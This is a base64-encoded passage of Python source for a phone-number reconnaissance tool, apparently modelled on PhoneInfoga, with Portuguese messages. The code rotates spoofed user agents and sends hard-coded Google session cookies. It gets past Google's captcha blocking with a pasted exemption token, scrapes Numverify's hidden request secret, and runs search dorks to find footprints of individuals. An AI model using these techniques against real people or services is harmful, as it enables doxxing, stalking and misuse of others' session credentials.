V0gT3DDp8OjbyBpbnbDoWxpZGEnKQogICAgICAgICN0aW1lLnNsZWVwKDMpCgoKZGVmIHBob25laW5mb2dhKCk6CiAgICB1YWdlbnQgPSBbIk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjApIE9wZXJhIDEyLjE0IiwKICAgICAgICAgICAgICAiTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCBpNjg2OyBydjoyNi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzI2LjAiLAogICAgICAgICAgICAgICJNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCB4ODZfNjQ7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDkxMyBGaXJlZm94LzMuNS4zIiwKICAgICAgICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBlbjsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA4MjQgRmlyZWZveC8zLjUuMyAoLk5FVCBDTFIgMy41LjMwNzI5KSIsCiAgICAgICAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMikgQXBwbGVXZWJLaXQvNTM1LjcgKEtIVE1MLCBsaWtlIEdlY2tvKSBDb21vZG9fRHJhZ29uLzE2LjEuMS4wIENocm9tZS8xNi4wLjkxMi42MyBTYWZhcmkvNTM1LjciLAogICAgICAgICAgICAgICJNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjI7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDgyNCBGaXJlZm94LzMuNS4zICguTkVUIENMUiAzLjUuMzA3MjkpIiwKICAgICAgICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBlbi1VUzsgcnY6MS45LjEuMSkgR2Vja28vMjAwOTA3MTggRmlyZWZveC8zLjUuMSIsCiAgICAgICAgICAgICAgIk1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo2My4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzYzLjAiXQoKICAgIG51bWJlciA9ICcnICAjIEZ1bGwgbnVtYmVyIGZvcm1hdDsgZS5nOiAzMzEyMzQ1Njc4CiAgICBsb2NhbE51bWJlciA9ICcnICAjIExvY2FsIG51bWJlciBmb3JtYXQ7IGUuZzogMDYgMTIgMzQgNTYgNzgKICAgIGludGVybmF0aW9uYWxOdW1iZXIgPSAnJyAgIyBJbnRlcm5hdGlvbmFsIG51bWJlciBmb3JtYXQ7IGUuZzogKzMzIDYgMTIgMzQgNTYgNzgKICAgIG51bWJlckNvdW50cnlDb2RlID0gJycgICMgRGlhbCBjb2RlOyBlLmc6IDMzCiAgICBudW1iZXJDb3VudHJ5ID0gJycgICMgQ291bnRyeTsgZS5nOiBmcgoKICAgIGdvb2dsZUFidXNlVG9rZW4gPSAnJwogICAgY3VzdG9tRm9ybWF0dGluZyA9ICcnCgogICAgY2xlYXIoKQoKICAgIGRlZiBzZWFyY2gocmVxLCBzdG9wKToKICAgICAgICBnbG9iYWwgZ29vZ2xlQWJ1c2VUb2tlbgogICAgICAgIGdsb2JhbCB1YWdlbnQKICAgICAgICBjaG9zZW5Vc2VyQWdlbnQgPSByYW5kb20uY2hvaWNlKHVhZ2VudCkKICAgICAgICByZXFTZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBjaG9zZW5Vc2VyQWdlbnQsCiAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksLztxPTAuOCcsCiAgICAgICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAncHQtYnIscHQ7cT0wLjUnLAogICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsZGVmbGF0ZScsCiAgICAgICAgICAgICdBY2NlcHQtQ2hhcnNldCc6ICdJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjcnLAogICAgICAgICAgICAnS2VlcC1BbGl2ZSc6ICcxMTUnLAogICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbm8tY2FjaGUnLAogICAgICAgICAgICAnQ29va2llJzogJ0Nvb2tpZTogQ0dJQz1JajkwWlhoMEwyaDBiV3dzWVhCd2JHbGpZWFJwYjI0dmVHaDBiV3dyZUcxc0xHRndjR3hwWTJGMGFXOXVMM2h0YkR0eFBUQXVPU3dxTHlvN2NUMHdMamc7ICAgICAgICAgICAgICAgIENPTlNFTlQ9WUVTK1JFLmZyKzIwMTUwODA5LTA4LTA7IDFQX0pBUj0yMDE4LTExLTI4LTE0OyBOSUQ9MTQ4PWFTZFNISno3MXJ1ZkNva2FVQzkzbkgzSDdsT2I4RTdCTmV6RFdWLVB5eWlIVFhxV0s1WTVoc3ZqN0lBemhaQUswNC0gICAgICBRTlRYallvTFhWdV9laUFKa2lFNDZEbE5uNkpqamdDdFktN0ZyMEk0SmFILVBaUmI3V0ZnU1RqaUZxaDBmdzJjQ1d5TjY5RGVQOTJkek1kNTcydFFXMloxZ1B3bm8zeHVQcllDMVQ2NHdPdWQxRGpaRGhWQVprcGs2VWtCclUwUEJjbkxXTDdZZEw2SWJFYUNRbEFJOUJ3YXhvSF9leXdQVnlTOVY7IFNJRD11QVlldTNnVDIzR0N6LWt0ZEdJblF1T1NmLTVTU3psM1BsdzExLUN3c0VZWTBtcUpMU2l2N3RGS2VScEJfNWl6OFNINWxnLjsgSFNJRD1BWm1IX2N0QWZzMFhiV09DSjsgU1NJRD1BMFBjUkpTeWxXSXhKWVRxXzsgQVBJU0lEPUhIQjJiS2ZKLTJaVUw1LVIvQWMwR0szcXRNOEVIa2xvTnc7IFNBUElTSUQ9d1FveGV0SEJweW80cEpLRS9BMlA2RFVNOXpHblN0cElWdDsgU0lEQ0M9QUJ0SG8tRWhGQWEyQUpySklVZ1JHdFJvb1d5VkswYkF3aVE0VWdEbUthbWZlODh4T1lCWE00N0ZvTDVvWmFUeFIzSC1lT3A3LXJFOyBPVFo9NDY3MTg2MV81Ml81Ml8xMjM5MDBfNDhfNDM2MzgwOyBPR1BDPTg3MzAzNTc3Ni04OjsgT0dQPS04NzMwMzU3NzY6OycKICAgICAgICB9CgogICAgICAgIHRyeToKICAgICAgICAgICAgUkVRID0gdXJsZW5jb2RlKHsncSc6IHJlcX0pCiAgICAgICAgICAgIFVSTCA9ICdodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD90YnM9bGk6MSZ7fSZhbXA7Z3dzX3JkPXNzbCZhbXA7Z2w9dXMgJy5mb3JtYXQoCiAgICAgICAgICAgICAgICBSRVEpCiAgICAgICAgICAgIHIgPSByZXFTZXNzaW9uLmdldChVUkwgKyBnb29nbGVBYnVzZVRva2VuLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgICB3aGlsZSByLnN0YXR1c19jb2RlICE9IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgICd7fVt7fUVSUk9Se31dIFZvY8OqIGVzdMOhIHRlbXBvcmFyaWFtZW50ZSBuYSBsaXN0YSBuZWdyYSBkYSBwZXNxdWlzYSBkbyBHb29nbGUuIFByZWVuY2hhIG8gY2FwdGNoYSBubyBzZWd1aW50ZSBVUkwgZSBjb3BpZSAvIGNvbGUgbyBjb250ZcO6ZG8gZG8gY29va2llIEdPT0dMRV9BQlVTRV9FWEVNUFRJT046IHt9Jy5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIEMsIFIsIEMsIFVSTCkpCiAgICAgICAgICAgICAgICB0b2tlbiA9IGlucHV0KCdcbkdPT0dMRV9BQlVTRV9FWEVNUFRJT049JykKICAgICAgICAgICAgICAgIGdvb2dsZUFidXNlVG9rZW4gPSAnJmdvb2dsZV9hYnVzZT0nICsgdG9rZW4KICAgICAgICAgICAgICAgIHIgPSByZXFTZXNzaW9uLmdldChVUkwgKyBnb29nbGVBYnVzZVRva2VuLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgICBzb3VwID0gQmVhdXRpZnVsU291cChyLnRleHQsICdodG1sNWxpYicpCgogICAgICAgICAgICByZXN1bHRzID0gc291cC5maW5kKCJkaXYiLCBpZD0ic2VhcmNoIikuZmluZF9hbGwoImRpdiIsIGNsYXNzXz0iZyIpCgogICAgICAgICAgICBsaW5rcyA9IFtdCiAgICAgICAgICAgIGNvdW50ZXIgPSAwCgogICAgICAgICAgICBmb3IgcmVzdWx0IGluIHJlc3VsdHM6CiAgICAgICAgICAgICAgICBjb3VudGVyICs9IDEKCiAgICAgICAgICAgICAgICBpZiBpbnQoY291bnRlcikgPiBpbnQoc3RvcCk6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgICAgICB1cmwgPSByZXN1bHQuZmluZCgiYSIpLmdldCgnaHJlZicpCiAgICAgICAgICAgICAgICB1cmwgPSByZS5zdWIocicoPzpcL3VybFw/cVw9KScsICcnLCB1cmwpCiAgICAgICAgICAgICAgICB1cmwgPSByZS5zdWIocicoPzpcL3VybFw/dXJsXD0pJywgJycsIHVybCkKICAgICAgICAgICAgICAgIHVybCA9IHJlLnN1YihyJyg/Olwmc2FcPSkoPzouKiknLCAnJywgdXJsKQogICAgICAgICAgICAgICAgdXJsID0gcmUuc3ViKHInKD86XCZyY3RcPSkoPzouKiknLCAnJywgdXJsKQoKICAgICAgICAgICAgICAgIGlmIHJlLm1hdGNoKHIiXig/Olwvc2VhcmNoXD9xXD0pIiwgdXJsKSBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICB1cmwgPSAnaHR0cHM6Ly9nb29nbGUuY29tJyArIHVybAoKICAgICAgICAgICAgICAgIGlmIHVybCBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICBsaW5rcy5hcHBlbmQodXJsKQoKICAgICAgICAgICAgcmV0dXJuIGxpbmtzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCgne31be31FUlJPUnt9XSBPIHBlZGlkbyBmYWxob3UuIFRlbnRlIG5vdmFtZW50ZS4nLmZvcm1hdChDLCBSLCBDKSkKICAgICAgICAgICAgcHJpbnQoZSkKICAgICAgICAgICAgcmV0dXJuIFtdCgogICAgZGVmIGZvcm1hdE51bWJlcihJbnB1dE51bWJlcik6CiAgICAgICAgcmV0dXJuIHJlLnN1YigiKD86XCspPyg/OlteWzAtOV0qKSIsICIiLCBJbnB1dE51bWJlcikKCiAgICBkZWYgbG9jYWxTY2FuKElucHV0TnVtYmVyKToKICAgICAgICBnbG9iYWwgbnVtYmVyCiAgICAgICAgZ2xvYmFsIGxvY2FsTnVtYmVyCiAgICAgICAgZ2xvYmFsIGludGVybmF0aW9uYWxOdW1iZXIKICAgICAgICBnbG9iYWwgbnVtYmVyQ291bnRyeUNvZGUKICAgICAgICBnbG9iYWwgbnVtYmVyQ291bnRyeQoKICAgICAgICBwcmludCgne31be31pe31dIEV4ZWN1dGFuZG8gdmVyaWZpY2HDp8OjbyBsb2NhbC4uLicuZm9ybWF0KEMsIFksIEMpKQoKICAgICAgICBGb3JtYXR0ZWRQaG9uZU51bWJlciA9ICIrIiArIGZvcm1hdE51bWJlcihJbnB1dE51bWJlcikKCiAgICAgICAgdHJ5OgogICAgICAgICAgICBQaG9uZU51bWJlck9iamVjdCA9IHBob25lbnVtYmVycy5wYXJzZShGb3JtYXR0ZWRQaG9uZU51bWJlciwgTm9uZSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIG5vdCBwaG9uZW51bWJlcnMuaXNfdmFsaWRfbnVtYmVyKFBob25lTnVtYmVyT2JqZWN0KToKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICAgICAgbnVtYmVyID0gcGhvbmVudW1iZXJzLmZvcm1hdF9udW1iZXIoCiAgICAgICAgICAgICAgICBQaG9uZU51bWJlck9iamVjdCwgcGhvbmVudW1iZXJzLlBob25lTnVtYmVyRm9ybWF0LkUxNjQpLnJlcGxhY2UoJysnLCAnJykKICAgICAgICAgICAgbnVtYmVyQ291bnRyeUNvZGUgPSBwaG9uZW51bWJlcnMuZm9ybWF0X251bWJlcigKICAgICAgICAgICAgICAgIFBob25lTnVtYmVyT2JqZWN0LCBwaG9uZW51bWJlcnMuUGhvbmVOdW1iZXJGb3JtYXQuSU5URVJOQVRJT05BTCkuc3BsaXQoJyAnKVswXQogICAgICAgICAgICBudW1iZXJDb3VudHJ5ID0gcGhvbmVudW1iZXJzLnJlZ2lvbl9jb2RlX2Zvcl9jb3VudHJ5X2NvZGUoCiAgICAgICAgICAgICAgICBpbnQobnVtYmVyQ291bnRyeUNvZGUpKQoKICAgICAgICAgICAgbG9jYWxOdW1iZXIgPSBwaG9uZW51bWJlcnMuZm9ybWF0X251bWJlcigKICAgICAgICAgICAgICAgIFBob25lTnVtYmVyT2JqZWN0LCBwaG9uZW51bWJlcnMuUGhvbmVOdW1iZXJGb3JtYXQuRTE2NCkucmVwbGFjZShudW1iZXJDb3VudHJ5Q29kZSwgJzAnKQogICAgICAgICAgICBpbnRlcm5hdGlvbmFsTnVtYmVyID0gcGhvbmVudW1iZXJzLmZvcm1hdF9udW1iZXIoCiAgICAgICAgICAgICAgICBQaG9uZU51bWJlck9iamVjdCwgcGhvbmVudW1iZXJzLlBob25lTnVtYmVyRm9ybWF0LklOVEVSTkFUSU9OQUwpCgogICAgICAgICAgICBjb3VudHJ5ID0gZ2VvY29kZXIuY291bnRyeV9uYW1lX2Zvcl9udW1iZXIoUGhvbmVOdW1iZXJPYmplY3QsICJlbiIpCiAgICAgICAgICAgIGxvY2F0aW9uID0gZ2VvY29kZXIuZGVzY3JpcHRpb25fZm9yX251bWJlcihQaG9uZU51bWJlck9iamVjdCwgImVuIikKICAgICAgICAgICAgY2Fycmllck5hbWUgPSBjYXJyaWVyLm5hbWVfZm9yX251bWJlcihQaG9uZU51bWJlck9iamVjdCwgJ2VuJykKCiAgICAgICAgICAgIHByaW50KGYnRm9ybWF0byBpbnRlcm5hY2lvbmFsOntCfSB7aW50ZXJuYXRpb25hbE51bWJlcn0nKQogICAgICAgICAgICBwcmludChmJ0Zvcm1hdG8gbG9jYWw6e0J9IDAge2xvY2FsTnVtYmVyfScpCiAgICAgICAgICAgIHByaW50KGYnUGHDrXM6IHtCfXtjb3VudHJ5fSAoe251bWJlckNvdW50cnlDb2RlfSknKQogICAgICAgICAgICBwcmludChmJ0NpZGFkZS9Fc3RhZG86e0J9IHtsb2NhdGlvbn0nKQogICAgICAgICAgICBwcmludChmJ09wZXJhZG9yYTp7Qn0ge2NhcnJpZXJOYW1lfScpCiAgICAgICAgICAgIGZvciB0aW1lem9uZVJlc3VsdCBpbiB0aW1lem9uZS50aW1lX3pvbmVzX2Zvcl9udW1iZXIoUGhvbmVOdW1iZXJPYmplY3QpOgogICAgICAgICAgICAgICAgcHJpbnQoZidGdXNvIGhvcsOhcmlvOntCfSB7dGltZXpvbmVSZXN1bHR9JykKCiAgICAgICAgICAgIGlmIHBob25lbnVtYmVycy5pc19wb3NzaWJsZV9udW1iZXIoUGhvbmVOdW1iZXJPYmplY3QpOgogICAgICAgICAgICAgICAgcHJpbnQoJ08gbsO6bWVybyDDqSB2w6FsaWRvIGUgcG9zc8OtdmVsLicpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgnTyBuw7ptZXJvIMOpIHbDoWxpZG8sIG1hcyBwb2RlIG7Do28gc2VyIHBvc3PDrXZlbC4nKQoKICAgIGRlZiBudW12ZXJpZnlTY2FuKCk6CiAgICAgICAgZ2xvYmFsIG51bWJlcgogICAgICAgIHByaW50KCdFeGVjdXRhbmRvIHNjYW4gY29tIE51bXZlcmlmeS5jb20uLi4nKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlcXVlc3RTZWNyZXQgPSAnJwogICAgICAgICAgICByZXNwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL251bXZlcmlmeS5jb20vJykKICAgICAgICAgICAgc291cCA9IEJlYXV0aWZ1bFNvdXAocmVzcC50ZXh0LCAiaHRtbDVsaWIiKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoJ051bXZlcmlmeS5jb20gbsOjbyBlc3TDoSBkaXNwb27DrXZlbCcpCiAgICAgICAgICAgIHJldHVybiAtMQoKICAgICAgICBmb3IgdGFnIGluIHNvdXAuZmluZF9hbGwoImlucHV0IiwgdHlwZT0iaGlkZGVuIik6CiAgICAgICAgICAgIGlmIHRhZ1snbmFtZSddID09ICJzY2xfcmVxdWVzdF9zZWNyZXQiOgogICAgICAgICAgICAgICAgcmVxdWVzdFNlY3JldCA9IHRhZ1sndmFsdWUnXQogICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgYXBpS2V5ID0gaGFzaGxpYi5tZDUoKCdudW1iZXInICsgJ3JlcXVlc3RTZWNyZXQnKS5lbmNvZGUoJ3V0Zi04JykpLmhleGRpZ2VzdCgpCgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdIb3N0JzogJ251bXZlcmlmeS5jb20nLAogICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6NjQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82NC4wJywKICAgICAgICAgICAgJ0FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsIC87IHE9MC4wMScsCiAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL251bXZlcmlmeS5jb20vJywKICAgICAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAogICAgICAgICAgICAnRE5UJzogJzEnLAogICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgJ1ByYWdtYSc6ICduby1jYWNoZScsCiAgICAgICAgICAgICdDYWNoZS1Db250cm9sJzogJ25vLWNhY2hlJwogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucmVxdWVzdCgKICAgICAgICAgICAgICAgICJHRVQiLAogICAgICAgICAgICAgICAgImh0dHBzOi8vbnVtdmVyaWZ5LmNvbS9waHBfaGVscGVyX3NjcmlwdHMvcGhvbmVfYXBpLnBocD9zZWNyZXRfa2V5PXt9Jm51bWJlcj17fSIuZm9ybWF0KGFwaUtleSwgbnVtYmVyKSwKICAgICAgICAgICAgICAgIGRhdGE9IiIsIGhlYWRlcnM9aGVhZGVycykKCiAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWRzKHJlc3BvbnNlLmNvbnRlbnQuZGVjb2RlKCd1dGYtOCcpKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoJ051bXZlcmlmeS5jb20gbsOjbyBlc3TDoSBkaXNwb27DrXZlbCcpCiAgICAgICAgICAgIHJldHVybiAtMQoKICAgICAgICBpZiByZXNwb25zZS5jb250ZW50ID09ICJVbmF1dGhvcml6ZWQiIG9yIHJlc3BvbnNlLnN0YXR1c19jb2RlICE9IDIwMDoKICAgICAgICAgICAgcHJpbnQoKCJ7fVt7fUVSUk9Se31dIE9jb3JyZXUgdW0gZXJybyBhbyBjaGFtYXIgYSBBUEkgKHNvbGljaXRhw6fDo28gaW5jb3JyZXRhIG91IGNoYXZlIGRlIEFQSSBpbmNvcnJldGEpLiIpKQogICAgICAgICAgICByZXR1cm4gLTEKCiAgICAgICAgaWYgZGF0YVsidmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgcHJpbnQoKAogICAgICAgICAgICAgICAgICAgICAgInt9W3t9RVJST1J7fV0gZXNwZWNpZmlxdWUgdW0gbsO6bWVybyBkZSB0ZWxlZm9uZSB2w6FsaWRvLiBFeGVtcGxvOiArNTU4NTk5OTk5OTk5OSAoREREIHBhw61zICsgREREIGVzdGFkbyArIG7Dum1lcm8iKSkKICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICBJbnRlcm5hdGlvbmFsTnVtYmVyID0gJyh7fSl7fScuZm9ybWF0KAogICAgICAgICAgICBkYXRhWyJjb3VudHJ5X3ByZWZpeCJdLCBkYXRhWyJsb2NhbF9mb3JtYXQiXSkKCiAgICAgICAgcHJpbnQoCiAgICAgICAgICAgIGYnTsO6bWVybzp7Qn0gKHtkYXRhWyJjb3VudHJ5X3ByZWZpeCJdfSkge2RhdGFbImxvY2FsX2Zvcm1hdCJdfScpCiAgICAgICAgcHJpbnQoCiAgICAgICAgICAgIGYnUGHDrXM6e0J9IHtkYXRhWyJjb3VudHJ5X25hbWUiXX0gKHtkYXRhWyJjb3VudHJ5X2NvZGUiXX0pJykKICAgICAgICBwcmludChmJ0NpZGFkZS9Fc3RhZG86e0J9IHtkYXRhWyJsb2NhdGlvbiJdfScpCiAgICAgICAgcHJpbnQoZidPcGVyYWRvcmE6IHtCfXtkYXRhWyJjYXJyaWVyIl19JykKICAgICAgICBwcmludChmJ1RpcG8gZGUgbGluaGE6e0J9IHtkYXRhWyJsaW5lX3R5cGUiXX0nKQoKICAgICAgICBpZiBkYXRhWyJsaW5lX3R5cGUiXSA9PSAnbGFuZGxpbmUnOgogICAgICAgICAgICBwcmludCgoIlByb3ZhdmVsbWVudGUgw6kgdW0gdGVsZWZvbmUgZml4bywgbWFzIGFpbmRhIHBvZGUgc2VyIHVtIG7Dum1lcm8gVm9JUCBmaXhvLiIpKQogICAgICAgIGVsaWYgZGF0YVsibGluZV90eXBlIl0gPT0gJ21vYmlsZSc6CiAgICAgICAgICAgIHByaW50KCgiUHJvdmF2ZWxtZW50ZSDDqSB1bSBuw7ptZXJvIGRlIGNlbHVsYXIsIG1hcyBhaW5kYSBwb2RlIHNlciB1bSBuw7ptZXJvIFZvSVAuIikpCgogICAgZGVmIG92aFNjYW4oKToKICAgICAgICBnbG9iYWwgbG9jYWxOdW1iZXIKICAgICAgICBnbG9iYWwgbnVtYmVyQ291bnRyeQoKICAgICAgICBwcmludCgne31be31FUlJPUnt9XUV4ZWN1dGFuZG8gT1ZIIHNjYW4uLi4nLmZvcm1hdChDLCBSLCBDKSkKCiAgICAgICAgcXVlcnlzdHJpbmcgPSB7IlBhw61zIjogbnVtYmVyQ291bnRyeS5sb3dlcigpfQoKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYWNjZXB0JzogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICJuby1jYWNoZSIKICAgICAgICB9CgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5yZXF1ZXN0KAogICAgICAgICAgICAgICAgIkdFVCIsICJodHRwczovL2FwaS5vdmguY29tLzEuMC90ZWxlcGhvbnkvbnVtYmVyL2RldGFpbGVkWm9uZXMiLCBkYXRhPSIiLCBoZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgICAgICBwYXJhbXM9cXVlcnlzdHJpbmcpCiAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWRzKHJlc3BvbnNlLmNvbnRlbnQuZGVjb2RlKCd1dGYtOCcpKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoJ0FQSSBPVkggaW5hY2Vzc8OtdmVsLiBUYWx2ZXogdGVudGUgbm92YW1lbnRlIG1haXMgdGFyZGUuJykKICAgICAgICAgICAgcmV0dXJuIC0xCgogICAgICAgIGlmIGlzaW5zdGFuY2UoZGF0YSwgbGlzdCk6CiAgICAgICAgICAgIGFza2VkTnVtYmVyID0gIjAiICsgbG9jYWxOdW1iZXIucmVwbGFjZShsb2NhbE51bWJlclstNDpdLCAneHh4eCcpCgogICAgICAgICAgICBmb3Igdm9pcF9udW1iZXIgaW4gZGF0YToKICAgICAgICAgICAgICAgIGlmIHZvaXBfbnVtYmVyWydudW1iZXInXSA9PSBhc2tlZE51bWJlcjoKICAgICAgICAgICAgICAgICAgICBwcmludCgoIjEgcmVzdWx0YWRvIGVuY29udHJhZG8gbmEgYmFzZSBkZSBkYWRvcyBPVkgiKSkKICAgICAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICAgICAgKGYiSW50ZXJ2YWxvIG51bcOpcmljbzp7Qn0ge3ZvaXBfbnVtYmVyWydudW1iZXInXX0iKSkKICAgICAgICAgICAgICAgICAgICBwcmludCgoZiJDaWRhZGU6e0J9IHt2b2lwX251bWJlclsnY2l0eSddfSIpKQogICAgICAgICAgICAgICAgICAgIHByaW50KCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJDw7NkaWdvIHBvc3RhbDoge0J9IHt2b2lwX251bWJlclsnemlwQ29kZSddIGlmIHZvaXBfbnVtYmVyWyd6aXBDb2RlJ10gaXMgbm90IE5vbmUgZWxzZSBhc2tGb3JFeGl0KCl9IikpCgogICAgZGVmIHJlcGxhY2VWYXJpYWJsZXMoc3RyaW5nKToKICAgICAgICBnbG9iYWwgbnVtYmVyCiAgICAgICAgZ2xvYmFsIGludGVybmF0aW9uYWxOdW1iZXIKICAgICAgICBnbG9iYWwgbG9jYWxOdW1iZXIKCiAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoJyRuJywgbnVtYmVyKQogICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCckaScsIGludGVybmF0aW9uYWxOdW1iZXIpCiAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoJyRsJywgbG9jYWxOdW1iZXIpCgogICAgICAgIHJldHVybiBzdHJpbmcKCiAgICBkZWYgb3NpbnRJbmRpdmlkdWFsU2NhbigpOgogICAgICAgIGdsb2JhbCBudW1iZXIKICAgICAgICBnbG9iYWwgaW50ZXJuYXRpb25hbE51bWJlcgogICAgICAgIGdsb2JhbCBudW1iZXJDb3VudHJ5Q29kZQogICAgICAgIGdsb2JhbCBjdXN0b21Gb3JtYXR0aW5nCgogICAgICAgIGRvcmtzID0ganNvbi5sb2FkKG9wZW4oJ29zaW50L2luZGl2aWR1YWxzLmpzb24nKSkKCiAgICAgICAgZm9yIGRvcmsgaW4gZG9ya3M6CiAgICAgICAgICAgIGlmIGRvcmtbJ2RpYWxDb2RlJ10gaXMgTm9uZSBvciBkb3JrWydkaWFsQ29kZSddID09IG51bWJlckNvdW50cnlDb2RlOgogICAgICAgICAgICAgICAgaWYgY3VzdG9tRm9ybWF0dGluZzoKICAgICAgICAgICAgICAgICAgICBkb3JrUmVxdWVzdCA9IHJlcGxhY2VWYXJpYWJsZXMoCiAgICAgICAgICAgICAgICAgICAgICAgIGRvcmtbJ3JlcXVlc3QnXSkgKyAnIHwgaW50ZXh0OiJ7fSInLmZvcm1hdChjdXN0b21Gb3JtYXR0aW5nKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBkb3JrUmVxdWVzdCA9IHJlcGxhY2VWYXJpYWJsZXMoZG9ya1sncmVxdWVzdCddKQoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgICgiUHJvY3VyYW5kbyBmb290cHJpbnRzIGVtIHt9Li4uIi5mb3JtYXQoZG9ya1snc2l0ZSddKSkpCgogICAgICAgICAgICAgICAgZm9yIHJlc3VsdCBpbiBzZWFyY2goZG9ya1JlcXVlc3QsIHN0b3A9ZG9ya1snc3RvcCddKToKICAgICAgICAgICAgICAgICAgICBwcmludCgoIlVSTDogIiArIHJlc3VsdCkpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gLTEKCiAgICBkZWYgb3NpbnRSZXB1dGF0aW9uU2NhbigpOgogICAgICAgIGdsb2JhbCBudW1iZXIKICAgICAgICBnbG9iYWwgaW50ZXJuYXRpb25hbE51bWJlcgogICAgICAgIGdsb2JhbCBjdXN0b21Gb3JtYXR0aW5nCgogICAgICAgIGRvcmtzID0ganNvbi5sb2FkKG9wZW4oJ29zaW50L3JlcHV0YXRpb24uanNvbicpKQoKICAgICAgICBmb3IgZG9yayBpbiBkb3JrczoKICAgICAgICAgICAgaWYgY3VzdG9tRm9ybWF0dGluZzoKICAgICAgICAgICAgICAgIGRvcmtSZXF1ZXN0ID0gcmVwbGFjZVZhcmlhYmxlcygKICAgICAgICAgICAgICAgICAgICBkb3JrWydyZXF1ZXN0J10pICsgJyB8IGludGV4dDoie30iJy5mb3JtYXQoY3VzdG9tRm9ybWF0dGluZykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRvcmtSZXF1ZXN0ID0gcmVwbGFjZVZhcmlhYmxlcyhkb3JrWydyZXF1ZXN0J10pCgogICAgI